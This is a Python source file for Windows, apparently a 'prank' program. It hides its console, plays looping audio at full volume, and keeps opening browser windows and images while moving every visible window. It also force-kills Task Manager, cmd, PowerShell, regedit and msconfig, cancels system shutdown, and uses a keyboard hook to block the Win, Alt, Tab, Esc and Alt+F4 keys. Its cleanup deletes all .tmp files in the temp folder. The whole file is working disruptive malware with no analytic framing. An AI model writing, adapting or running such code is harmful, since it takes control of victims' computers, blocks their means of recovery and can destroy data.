import threading
import time
import sys
import os
import random
import subprocess
import tempfile
import ctypes
from ctypes import wintypes

stop_flag = threading.Event()
LOCK_FILE = os.path.join(tempfile.gettempdir(), "prank_lock.tmp")

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def cleanup_and_exit():
    try:
        processes_to_kill = [
            "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe",
            "mspaint.exe", "Photos.exe", "Windows.Photos.exe",
            "wmplayer.exe", "vlc.exe", "powershell.exe"
        ]
        
        for process in processes_to_kill:
            subprocess.run(["taskkill", "/f", "/im", process], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        temp_files = [
            os.path.join(tempfile.gettempdir(), "*.tmp"),
            os.path.join(tempfile.gettempdir(), "prank_*")
        ]
        
        for pattern in temp_files:
            subprocess.run(["del", "/q", pattern], shell=True, 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["taskkill", "/f", "/im", "audiodg.exe"], 
                     capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
    except:
        pass

def check_if_running():
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
            
            cleanup_and_exit()
            
            subprocess.run(["taskkill", "/f", "/pid", str(pid)], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            os.remove(LOCK_FILE)
            
            time.sleep(2)
            
        except:
            pass
        sys.exit(0)
    else:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))

def get_files_by_type():
    base = os.path.dirname(os.path.abspath(__file__))
    html_files = []
    image_files = []
    audio_files = []
    
    for base_path in [base, os.path.dirname(base)]:
        for folder in ["dist/storage", "storage"]:
            folder_path = os.path.join(base_path, folder)
            if os.path.isdir(folder_path):
                for file in os.listdir(folder_path):
                    file_path = os.path.join(folder_path, file)
                    if os.path.isfile(file_path):
                        if file == 'index' or file.endswith('.html'):
                            html_files.append(file_path)
                        elif file.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                            image_files.append(file_path)
                        elif file.endswith(('.mp3', '.wav')):
                            audio_files.append(file_path)
    
    return html_files, image_files, audio_files

def play_audio_multiple():
    _, _, audio_files = get_files_by_type()
    
    def start_audio_wave():
        for audio_file in audio_files:
            for i in range(4):
                try:
                    subprocess.Popen([
                        "powershell", "-WindowStyle", "Hidden", "-Command", 
                        f"""
                        $player = New-Object -ComObject WMPlayer.OCX
                        $player.URL = '{audio_file}'
                        $player.settings.setMode('loop', $true)
                        $player.settings.volume = 100
                        $player.controls.play()
                        Start-Sleep 2
                        while($player.playState -ne 1) {{ 
                            $player.controls.play()
                            Start-Sleep 1 
                        }}
                        while($true) {{ Start-Sleep 1 }}
                        """
                    ], creationflags=subprocess.CREATE_NO_WINDOW)
                    
                    time.sleep(0.5)
                    
                except:
                    pass
    
    threading.Thread(target=start_audio_wave, daemon=True).start()

def open_html_in_new_window():
    html_files, _, _ = get_files_by_type()
    for html_file in html_files:
        try:
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            
            x = random.randint(0, screen_width - 800)
            y = random.randint(0, screen_height - 600)
            
            subprocess.Popen([
                "start", "chrome", "--new-window", 
                f"--window-position={x},{y}",
                "--window-size=800,600",
                f"file:///{html_file.replace(os.sep, '/')}"
            ], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def open_random_image():
    _, image_files, _ = get_files_by_type()
    if image_files:
        try:
            random_image = random.choice(image_files)
            subprocess.Popen([random_image], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def move_all_windows():
    def enum_windows_proc(hwnd, lParam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                window_title = buff.value.lower()
                
                if not any(keyword in window_title for keyword in ['task manager', 'диспетчер задач', 'taskmgr', 'program manager', 'explorer']):
                    screen_width = user32.GetSystemMetrics(0)
                    screen_height = user32.GetSystemMetrics(1)
                    
                    rect = wintypes.RECT()
                    user32.GetWindowRect(hwnd, ctypes.byref(rect))
                    
                    current_x = rect.left
                    current_y = rect.top
                    
                    dx = random.randint(-30, 30)
                    dy = random.randint(-30, 30)
                    
                    new_x = max(-50, min(screen_width + 50, current_x + dx))
                    new_y = max(-50, min(screen_height + 50, current_y + dy))
                    
                    user32.SetWindowPos(hwnd, 0, new_x, new_y, 0, 0, 0x0001 | 0x0004)
        return True
    
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    enum_proc = WNDENUMPROC(enum_windows_proc)
    
    while not stop_flag.is_set():
        try:
            user32.EnumWindows(enum_proc, 0)
        except:
            pass
        time.sleep(0.05)

def block_shutdown_and_system():
    def enum_windows_proc(hwnd, lParam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                window_title = buff.value.lower()
                
                blocked_windows = [
                    'task manager', 'диспетчер задач', 'taskmgr',
                    'shutdown', 'выключение', 'restart', 'перезагрузка',
                    'control panel', 'панель управления', 'settings', 'параметры',
                    'system configuration', 'конфигурация системы', 'msconfig',
                    'command prompt', 'командная строка', 'cmd', 'powershell'
                ]
                
                if any(keyword in window_title for keyword in blocked_windows):
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)
        return True
    
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    enum_proc = WNDENUMPROC(enum_windows_proc)
    
    while not stop_flag.is_set():
        try:
            user32.EnumWindows(enum_proc, 0)
            
            blocked_processes = [
                "taskmgr.exe", "cmd.exe", "powershell.exe", "shutdown.exe",
                "msconfig.exe", "regedit.exe", "control.exe"
            ]
            
            for process in blocked_processes:
                try:
                    subprocess.run(["taskkill", "/f", "/im", process], 
                                 capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=1)
                except:
                    pass
            
            try:
                subprocess.run(["shutdown", "/a"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=1)
            except:
                pass
                
        except:
            pass
        time.sleep(0.1)

def html_opener():
    while not stop_flag.is_set():
        try:
            open_html_in_new_window()
        except:
            pass
        time.sleep(1)

def image_opener():
    while not stop_flag.is_set():
        try:
            open_random_image()
        except:
            pass
        time.sleep(2)

def block_keyboard_shortcuts():
    def low_level_keyboard_proc(nCode, wParam, lParam):
        if nCode >= 0:
            if wParam == 0x0100 or wParam == 0x0104:
                vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
                
                blocked_keys = [
                    0x5B,
                    0x5C,
                    0x12,
                    0x09,
                    0x1B,
                ]
                
                if vk_code in blocked_keys:
                    return 1
                
                if (ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000) and (
                    vk_code == ord('R') or vk_code == ord('T') or 
                    vk_code == 0x1B or vk_code == 0x08
                ):
                    return 1
                
                if (ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000) and (
                    vk_code == 0x09 or vk_code == 0x73
                ):
                    return 1
        
        return ctypes.windll.user32.CallNextHookExW(None, nCode, wParam, lParam)
    
    try:
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        hook_proc = HOOKPROC(low_level_keyboard_proc)
        
        hook_id = ctypes.windll.user32.SetWindowsHookExW(
            13, hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0
        )
        
        while not stop_flag.is_set():
            time.sleep(0.1)
            
        ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
    except:
        pass

def main():
    check_if_running()
    
    try:
        play_audio_multiple()
        threading.Thread(target=html_opener, daemon=True).start()
        threading.Thread(target=image_opener, daemon=True).start()
        threading.Thread(target=move_all_windows, daemon=True).start()
        threading.Thread(target=block_shutdown_and_system, daemon=True).start()
        threading.Thread(target=block_keyboard_shortcuts, daemon=True).start()
        
        while not stop_flag.is_set():
            time.sleep(1)
            
    except KeyboardInterrupt:
        stop_flag.set()
        try:
            os.remove(LOCK_FILE)
        except:
            pass
        sys.exit(0)

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()